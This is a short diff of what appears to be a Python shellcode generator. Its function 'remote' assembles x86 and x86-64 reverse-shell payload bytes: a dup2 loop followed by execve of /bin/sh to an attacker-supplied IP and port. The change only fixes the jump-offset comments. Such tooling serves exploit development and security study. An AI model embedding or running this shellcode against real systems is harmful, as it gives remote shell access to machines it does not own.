@@ -84,7 +84,7 @@ def remote(arch, ipStr, portNum) :
                   "\xfe\xc9"            + #dec    cl       <─┐
                   "\xb0\x3f"            + #mov    al, 0x3f   │
                   "\xcd\x80"            + #int    0x80       │ // sys_dup2
-                  "\x75\xf8"            + #jne    -6        ─┘
+                  "\x75\xf8"            + #jne    -8        ─┘
                   "\x31\xc0"            + #xor    eax, eax
                   "\x52"                + #push   edx
                   GetPushStrAsm('/bin/sh') + #push  /bin/sh
@@ -133,7 +133,7 @@ def remote(arch, ipStr, portNum) :
                 "\x6a\x21"              + #push   0x21    │
                 "\x58"                  + #pop    rax     │
                 "\x0f\x05"              + #syscall        │ // sys_dup2
-                "\x75\xf6"              + #jne    -0x8   ─┘
+                "\x75\xf6"              + #jne    -0xa   ─┘
                 "\x48\x31\xff"          + #xor    rdi, rdi
                 "\x57"                  + #push   rdi
                 "\x57"                  + #push   rdi
